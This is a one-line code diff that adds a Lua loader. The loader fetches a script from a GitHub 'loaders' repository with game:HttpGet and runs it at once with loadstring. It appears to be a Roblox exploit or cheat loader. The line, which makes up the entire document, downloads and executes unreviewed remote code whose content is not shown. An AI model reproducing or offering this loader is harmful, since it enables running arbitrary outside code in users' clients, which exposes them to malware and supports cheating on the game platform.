@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/runaways-beta-spam0-rbnsfy48g0k9be.lua"))()
